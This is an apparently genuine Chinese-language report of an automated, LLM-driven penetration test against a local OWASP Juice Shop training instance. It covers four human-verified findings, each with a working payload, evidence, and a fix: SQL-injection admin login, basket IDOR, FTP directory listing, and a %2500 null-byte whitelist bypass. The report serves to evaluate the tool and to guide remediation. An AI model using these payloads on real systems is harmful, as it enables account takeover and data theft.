# Juice Shop 20.3.0 自动化渗透报告（第 1 轮，2026-11-05）

> 目标：`http://127.0.0.1:3001` — OWASP Juice Shop 20.3.0（GitHub 开源项目，本地自建，自有资产）
> 引擎：ARTEX 任务 #13（模型层 Zro `deepseek-v4.1-flash`，网关 8790）
> 范围：只读 + 认证类请求；任务级 allow-list 仅放行 `127.0.0.1:3001` / `localhost:3001`
> 说明：目标本身是「故意不安全」的训练应用，发现**不用于对外披露**，只作为引擎能力验证。

---

## 一、已确认发现（人工复核过）

### F1 · Critical · 登录接口 SQL 注入导致管理员免密登录

| 项 | 内容 |
|---|---|
| 位置 | `POST /rest/user/login` 的 `email` 字段 |
| Payload | `{"email":"' OR 1=1--","password":"x"}` |
| 对照 | `{"email":"admin@juice-sh.op","password":"definitely-wrong"}` → **401 Invalid email or password.** |
| 结果 | payload → **HTTP 200**，返回 JWT；解码后 `id=1, email=admin@juice-sh.op, role=admin` |
| 影响 | 未授权获取管理员会话，可访问管理接口、读取全部订单/用户数据 |
| 修复 | 参数化查询（`db.get('SELECT * FROM Users WHERE email = ? AND password = ?')`）；口令用哈希比对，不要 SQL 拼接 |

**证据（实测原文，2026-11-05 09:0x）**

```
control (wrong password): (401, 'Invalid email or password.')
payload (OR 1=1--):       (200, '{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.
                          eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3Ai
                          LCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIi...
```

> 注：ARTEX 把它报为 `critical/pending`，人工复核确认成立。这是 Juice Shop 的经典挑战（Login Admin），
> 对训练靶场属预期行为；验证的是「引擎能否发现并给出可复现证据」。

### F2 · High · 购物篮接口越权（IDOR）：普通用户可读任意用户购物篮

| 项 | 内容 |
|---|---|
| 位置 | `GET /rest/basket/{id}` |
| 前置 | 普通用户 `jim@juice-sh.op` 登录，token 内 `bid=2` |
| 对照 | `GET /rest/basket/2` → 200，`UserId:2`（自己的） |
| 结果 | `GET /rest/basket/1` → **200**，`{"id":1,...,"UserId":1}` —— **管理员（UserId=1）的购物篮** |
| 影响 | 横向越权读取他人购物车；配合 `GET /api/Users/` 可拿到全量用户表 |
| 修复 | 服务端校验 `basket.UserId == token.bid`，不信任路径参数 |

**证据（2026-11-05 09:41 复核）**

```
login jim@juice-sh.op/ncc-1701 -> 200, bid=2
GET /rest/basket/1 (as jim) -> 200  body={"status":"success","data":{"id":1,"coupon":null,"UserId":1,...
GET /api/Users/    (as jim) -> 200  len=7197  含 {"id":1,"email":"admin@juice-sh.op","role":"admin",...
```

### F3 · Medium · `/ftp/` 未授权目录浏览，暴露备份与密钥库文件清单

| 项 | 内容 |
|---|---|
| 位置 | `GET /ftp/`、`GET /ftp/quarantine/`（均无需认证） |
| 结果 | 两者均 **200**，返回 HTML 目录索引 |
| 泄露内容 | `/ftp/`：`package.json.bak`、`package-lock.json.bak`、`coupons_2013.md.bak`、`incident-support.kdbx`、`acquisitions.md`、`suspicious_errors.yml` 等 12 项<br>`/ftp/quarantine/`：4 个 `juicy_malware_*` 恶意样本下载链接 |
| 影响 | 未认证即可枚举内部备份文件名与 KeePass 密钥库，为后续下载/爆破提供精准目标 |
| 修复 | 关闭 `/ftp` 目录的 autoindex（Express `serve-static` 的 `index:false` + 显式返回 403） |

**证据**

```
GET /ftp/            -> 200  bytes=11253  links=12
  ['.', 'quarantine', 'acquisitions.md', 'announcement_encrypted.md', 'coupons_2013.md.bak',
   'eastere.gg', 'encrypt.pyc', 'incident-support.kdbx', 'legal.md',
   'package-lock.json.bak', 'package.json.bak', 'suspicious_errors.yml']
GET /ftp/quarantine/ -> 200  bytes=9534   links=7   （含 4 个 juicy_malware_*.url）
```

### F4 · High · `/ftp` 扩展名白名单可被 `%2500` 双重编码绕过（任意备份文件下载）

| 项 | 内容 |
|---|---|
| 位置 | `/ftp/{file}` 的「仅允许 `.md/.pdf` 结尾」白名单 |
| 对照 | `GET /ftp/package.json.bak` → **403**（被白名单挡）<br>`GET /ftp/package.json` → **403** |
| 结果 | `GET /ftp/package.json.bak%2500.md` → **200**，正文 `{ "name": "juice-shop", ...}` 完整 JSON |
| 机理 | 校验发生在一次 URL 解码后：`%2500` → `%00` 仍在字符串里、且结尾是 `.md`，白名单通过；<br>真正的文件查找再解码一次，`%00` 被截断为终止符 → 实际打开 `package.json.bak` |
| 影响 | 绕过白名单下载 `package-lock.json.bak`、`incident-support.kdbx` 等全部非白名单文件 |
| 修复 | 先规范化（多次解码直到稳定）再校验；用文件白名单而非后缀名；拒绝含 `%00`/`\0` 的路径 |

**证据**

```
GET /ftp/package.json.bak         -> 403
GET /ftp/package.json.bak%2500.md -> 200  body={"name": "juice-shop", ...
GET /ftp/package.json.bak%00.md   -> 400
GET /ftp/package.json             -> 403
```

---

## 二、任务执行状态

| 项 | 值 |
|---|---|
| ARTEX 任务 | #13 `JuiceShop-20.3.0 自动化渗透第1轮（只读）` |
| 状态 | **`done`**（2026-11-05 09:0x 收官） |
| 边界 | 任务级 allow-list 两条（127.0.0.1:3001 / localhost:3001），其余资产一律拒绝 |
| 引擎自报 | 4 条 finding（#52 critical / #53 high / #54 medium / #55 high） |
| 人工复核 | **4 条全部成立（4/4）**，详见 F1–F4 |
| 误报 | 0 |
| 漏报 | 未评估（未做独立全量扫描对照） |

### 这 4/4 说明了什么，以及不能说明什么

**能说明**：引擎确实会「先跑对照、再打 payload、拿真实响应下结论」。F1 有 401→200 对照，F4 有 403→200 对照，
都不是靠页面文案猜的；F4 的 `%2500` 双重编码绕过尤其不像模板化输出——Juice Shop 里这一步需要理解
「校验解码一次、文件查找再解码一次」的时序差。

**不能说明**：Juice Shop 是**公开的、故意不安全的**训练应用，这 4 条都是已经写在官方挑战列表里的题
（Login Admin / Basket Access / Forgotten Backup / Poison Null Byte）。所以 4/4 证明的是
「执行链路通、证据链完整」，**不能**外推成「能发现真实软件的未知漏洞」。
后者必须换真实栈来测——这也是下一轮换 Gitea 的原因。

### 运行约束（复用经验）

1. Windows shell 不是 bash：任务描述里写死「禁止 curl/管道，HTTP 一律 python urllib」。
2. 任务创建后不自动跑：需重启 ARTEX 触发 `Engine.Run`（本次由 09:0x 重启完成）。
3. `tokens` 字段恒为 0，判断是否在跑要看 `status` 与 findings。
4. **复核必须自己发请求**，不能读 finding 正文就认——本轮 #54 我第一次读响应时被 `IncompleteRead` 截断，
   差点误判为「不成立」，改成容错分块读取才拿到完整的 12 条目录项。

---

## 三、下一轮建议

| 优先级 | 动作 |
|---|---|
| 高 | 等 #13 跑完，逐条复核（尤其 XSS/越权），把「引擎报的」与「人工确认的」分开统计 |
| 中 | 换第二个开源目标（VAmPI / DVGA，纯 Python，无需 Docker），验证跨栈一致性 |
| 低 | Docker 修复后跑 Vulhub 真实 CVE 环境（Log4Shell / GitLab 文件读），那才是「真实软件」数据 |
